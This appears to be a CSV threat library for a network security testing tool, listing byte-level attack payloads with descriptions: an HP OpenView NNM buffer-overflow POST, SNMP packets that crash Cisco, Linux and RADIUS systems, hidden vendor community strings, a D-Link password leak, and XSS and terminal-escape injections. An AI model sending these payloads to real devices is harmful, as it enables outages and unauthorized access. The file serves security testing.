XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿FSC20100512-03_HP_OpenView_NNM_snmpviewer.exe_CGI_Stack_Buffer_Overflow.xml,HP OpenView NNM snmpviewer.exe CGI Stack Buffer Overflow,"A stack buffer overflow vulnerability exists in HP OpenView Network Node Manager (NNM). The vulnerability is due to a boundary error in the snmpviewer.exe CGI program when processing certain parameters sent in a crafted HTTP request. A remote unauthenticated attacker can exploit this vulnerability by sending a crafted HTTP POST request to a target server, potentially causing arbitrary code to be injected and executed in the security context of the web server process. In an attack scenario, where arbitrary code is injected and executed on the target machine, the behaviour of the target is dependent on the intention of the malicious code.",HTTP,TCP,POST /OvCgi/snmpviewer.exe HTTP/1.0||0D 0A ||Content-Length||3A || 1230||0D 0A 0D 0A ||ins=load&app=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&act=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
FSC20100512-03_HP_OpenView_NNM_snmpviewer.exe_CGI_Stack_Buffer_Overflow.xml,HP OpenView NNM snmpviewer.exe CGI Stack Buffer Overflow,"A stack buffer overflow vulnerability exists in HP OpenView Network Node Manager (NNM). The vulnerability is due to a boundary error in the snmpviewer.exe CGI program when processing certain parameters sent in a crafted HTTP request. A remote unauthenticated attacker can exploit this vulnerability by sending a crafted HTTP POST request to a target server, potentially causing arbitrary code to be injected and executed in the security context of the web server process. In an attack scenario, where arbitrary code is injected and executed on the target machine, the behaviour of the target is dependent on the intention of the malicious code.",HTTP,TCP,"HTTP/1.1 502 Gateway Error||0D 0A ||Server||3A || Microsoft-IIS/5.0||0D 0A ||Date||3A || Thu, 20 May 2010 15||3A ||50||3A ||27 GMT||0D 0A ||Content-Length||3A || 215||0D 0A ||Content-Type||3A || text/html||0D 0A 0D 0A ||<head><title>Error in CGI Application</title></head>||0A ||<body><h1>CGI Error</h1>The specified CGI application misbehaved by not returning a complete set of HTTP headers.  The headers it did return are||3A ||<p><p><pre></pre>"
﻿SNMPprobe.xml,SNMP Probe OID\: 2,This threat sends an SNMP get-next request with a OID of 2. May indicate that someone is trying to glean as much information possible from the system by requesting such a large dataset.,SNMP,UDP,0||22 02 01 00 04 06 ||pub||6c ||ic||a1 15 02 04 01 d9 b5 9b 02 01 00 02 01 00 ||0||07 ||0||05 06 01 02 05 00||
﻿SNMPv3PIX.xml,Cisco PIX SNMPv3 Denial of Service,This threat sends an SNMPv3 message to the target. This can cause a Cisco PIX firewall to crash.,SNMPv3,UDP,0g||02 01 03 ||0||11 02 04 ||hX||0e d5 02 03 00 ff e3 04 01 04 02 01 03 04 22 ||0 ||04 0c 00 00 00 00 00 00 00 00 12 ||4Vx||02 01 00 02 01 05 04 06 ||pub||6c ||ic||04 00 04 00 ||0||2b 04 0c 00 00 00 00 00 00 00 00 12 ||4Vx||04 00 a1 19 02 04 2a 0b ||IT||02 01 00 02 01 00 ||0||0b ||0||09 06 05 2b 06 01 02 01 05 00||
﻿SNMPv3catDoS.xml,Cisco SNMPv3 Denial of Service,This threat sends an SNMPv3 message to the target on port 162. Can cause various versions of IOS to crash.,SNMPv3,UDP,0g||02 01 03 ||0||11 02 04 ||hX||0e d5 02 03 00 ff e3 04 01 04 02 01 03 04 22 ||0 ||04 0c 00 00 00 00 00 00 00 00 12 ||4Vx||02 01 00 02 01 05 04 06 ||pub||6c ||ic||04 00 04 00 ||0||2b 04 0c 00 00 00 00 00 00 00 00 12 ||4Vx||04 00 a1 19 02 04 2a 0b ||IT||02 01 00 02 01 00 ||0||0b ||0||09 06 05 2b 06 01 02 01 05 00||
﻿avaya_snmp_hidden.xml,Avaya Hidden Community String,This threat sends an SNMP probe with the community string NoGaH$@!.  This community string is enabled in certain Avaya switches and allows read and write access.,SNMP,UDP,0(||02 01 00 04 08 ||NoGaH$@!||A1 19 02 04 ||A||CB 8C 85 02 01 00 02 01 00 ||0||0B ||0||09 06 05 ||+||06 01 02 01 05 00||
﻿ciscoMalSNMP.xml,Cisco Malformed SNMPv1 Message Denial of Service,This threat creates a malformed SNMPv1 request which causes the Cisco device under test to reboot or require a manual reset.,SNMP,UDP,0||81 af 02 01 00 04 06 ||pub||6c ||ic||a0 81 a1 02 02 09 ||(||02 01 00 02 01 00 ||0||81 94 ||0||81 91 06 81 8c 4d ||s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s||81 ff ff ff ff ff ff ff ff 7f 05 00||
﻿ciscoMalSNMP2.xml,Cisco IOS Solicited SNMP Message Crash,This threat fires a solicited SNMP message to port 162 of the target machine.  This will cause a crash/reboot in older versions of Cisco IOS.,SNMP,UDP,0)||02 01 00 04 06 ||pub||6c ||ic||a0 1c 02 04 ||7||b4 1e ||W||02 01 00 02 01 00 ||0||0e ||0||0c 06 08 2b 06 01 02 01 01 01 00 05 00||
﻿dlink_snmp_pass.xml,D-Link Wireless Router Password Disclosure,"This threat sends an SNMP request that causes certain versions of D-Link's wireless routers to disclose the password for the device.  This can be used by an attacker to redirect traffic, or deny service to other users.",SNMP,UDP,0-||02 01 00 04 06 ||public||A0 || ||02 04 ||X.u||86 02 01 00 02 01 00 ||0||12 ||0||10 06 0C ||+||06 01 04 01 87 ||)||02 01 02 02 00 05 00||
﻿hpopenview_snmp_hidden.xml,HP OpenView Hidden Community Name,This threat performs a SNMP probe of an HP OpenView system with community name snmpd.  This is an undocumented community present in certain versions of HP OpenView.  This community string has read and write access to the system configuration.  SNMP typically listens on port 161.,SNMP,UDP,0%||02 01 00 04 05 ||snmpd||A1 19 02 04 ||U3<a||02 01 00 02 01 00 ||0||0B ||0||09 06 05 ||+||06 01 02 01 05 00||
﻿linux_natsnmp_dos.xml,Linux Kernel SNMP NAT Helper Remote DoS,This threat sends a specially crafted snmp packet to trigger a denial of service condition in the SNMP NAT module of the Linux Kernel. The NAT SNMP module typically runs on udp ports 161 and 162.,SNMP,UDP,0||0A 02 01 00 04 03 ||ECL||A4 00||
﻿nokia_snmp.xml,Nokia SNMP Disclosure of Information,"This threat sends an SNMP request with the community string of tellmeyoursecrets.  However, the flaw is that certain versions of the Nokia SGSN will respond to SNMP requests regardless of the community string specified allowing an attacker to read or set SNMP variables without knowing the community string.",SNMP,UDP,01||02 01 00 04 11 ||tellmeyoursecrets||A1 19 02 04 ||/Y||9E AA 02 01 00 02 01 00 ||0||0B ||0||09 06 05 ||+||06 01 02 01 05 00||
﻿oneSNMP.xml,SNMP Probe OID\: 1,This threat sends an SNMP get-next request with a OID of 1. May indicate that someone is trying to glean as much possible information from the system by requesting such a large dataset.,SNMP,UDP,0||22 02 01 00 04 06 ||pub||6c ||ic||a1 15 02 04 ||u||91 1b ||%||02 01 00 02 01 00 ||0||07 ||0||05 06 01 01 05 00||
﻿radiusSNMP.xml,GNU SNMP RADIUS DoS,This threat attacks a flaw in GNU SNMP RADIUS. It sends an invalid SNMP packet destined for the GNU RADIUS server.  This will cause a crash in certain versions.,"SNMP, RADIUS",UDP,0&||02 01 00 04 06 ||public||A0 19 02 01 03 02 01 00 02 01 00 ||0||0E ||0||0C 06 08 FF FF FF FF FF FF FF FF 05 00||
﻿snmpTerm.xml,SNMP Terminal Escape Code Community String,This threat sends an SNMP community string containing terminal escape codes that will change the title of certain terminal applications.  Terminal escape codes can be used to fool a user into executing commands.  This threat targets an SNMP daemon which typically listens on port 161.,SNMP,UDP,0C||02 01 00 04 ||#aa||1B ||]0||3B ||imperfect owns your terminal||07 A1 19 02 04 ||z||DB ||E||91 02 01 00 02 01 00 ||0||0B ||0||09 06 05 ||+||06 01 02 01 05 00||
﻿snmpXSS.xml,SNMP XSS attempt,"This threat sends a SNMP XSS attempt.  It specifies the community string as Javascript code, causing a web event log to execute that code in the context of the user browsing the administrative site.  This can be used to hide log details, perform actions in the administration site, and attempt to exploit the browser with malware. SNMP traffic is sent to UDP port 161.",SNMP,UDP,0]||02 01 00 04 ||=</script><script>document.location='http||3A ||//cnn.com'||3B ||</script>||A1 19 02 04 1A 02 86 D3 02 01 00 02 01 00 ||0||0B ||0||09 06 05 ||+||06 01 02 01 05 00||
﻿solaris_snmp_hidden.xml,Solaris Hidden Community String,This threat sends out a SNMP request with a community string of 'all private'.  This is an undocumented community string that allows access to the Solaris system.,SNMP,UDP,0+||02 01 00 04 0B ||all private||A1 19 02 04 07 ||B||19 08 02 01 00 02 01 00 ||0||0B ||0||09 06 05 ||+||06 01 02 01 05 00||
